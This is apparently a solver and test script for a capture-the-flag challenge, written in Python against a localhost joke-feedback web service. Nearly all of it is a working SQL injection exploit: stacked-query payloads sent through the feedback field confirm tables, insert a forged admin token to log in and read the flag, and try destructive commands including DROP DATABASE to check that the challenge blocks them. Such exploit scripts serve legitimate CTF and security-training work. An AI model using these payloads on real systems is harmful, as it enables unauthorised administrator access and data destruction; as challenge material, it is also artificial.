import requests
import base64
import time

def encode_credentials(username, password):
    credentials = f"{username}:{password}"
    encoded_credentials = base64.b64encode(credentials.encode()).decode()
    return encoded_credentials

def get_flag(username, password):
    url = "http://localhost/admin/flags"
    encoded_credentials = encode_credentials(username, password)
    headers = {
        "Authorization": f"Bearer {encoded_credentials}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return f"An error occurred: {e}"

def send_feedback(feedback, joke_id):
    url = "http://localhost/feedback"
    data = {
        "feedback": feedback,
        "joke_id": joke_id
    }
    try:
        response = requests.post(url, json=data)
        response.raise_for_status()
        return response.json(), response.status_code
    except requests.exceptions.RequestException as e:
        return response.json(), response.status_code # SQL injection causes 500

def is_alive():
    url = "http://localhost"
    retries = 5
    for i in range(retries):
        try:
            response = requests.get(url)
            response.raise_for_status()
            return response.text
        except requests.exceptions.RequestException as e:
            if i < retries - 1:
                time.sleep(1)
            else:
                raise Exception(f"An error occurred after {retries} attempts: {e}")

if __name__ == "__main__":

    # time.sleep(120) # allow everything to fully load.

    is_alive() # check the server is alive

    # Basic test
    joke_id = "1"
    injection = '"'

    # Response shows SQL injection, code will also be given
    res, _ = send_feedback(injection, joke_id)
    assert 'You have an error in your SQL syntax' in res.get('error')

    # Notice that valid SQL queries return 200, invalid return 500
    injection = '"); SELECT NULL FROM admin; -- -'
    res, status_code = send_feedback(injection, joke_id)
    assert status_code == 200

    # Notice from the commented code there is a database called flag
    injection = '"); SELECT NULL FROM flag; -- -'
    res, status_code = send_feedback(injection, joke_id)
    assert status_code == 200

    # Two options at this point. Blind SQLi to extract tables or another (better) way...
    creds = encode_credentials("admin", "admin")
    injection = f'"); INSERT IGNORE INTO admin (token) VALUES (\'{creds}\'); -- -'
    res, status_code = send_feedback(injection, joke_id)
    assert status_code == 200

    # Now the credentials admin:admin have been added to the DB as a valid administrator, log in!
    res = get_flag("admin", "admin")
    flag = res.get("flags")[0]
    print(flag)
    assert "hackpackCTF{" in flag

    # We should NOT be able to edit or drop tables
    injection = f'"); INSERT IGNORE INTO flag (flag) VALUES (\'EVIL\'); -- -'
    res, status_code = send_feedback(injection, joke_id)
    assert "command denied" in res.get("error")
    assert status_code == 500

    injection = f'"); DROP DATABASE ctfdb; -- -'
    res, status_code = send_feedback(injection, joke_id)
    assert "Access denied" in res.get("error")
    assert status_code == 500
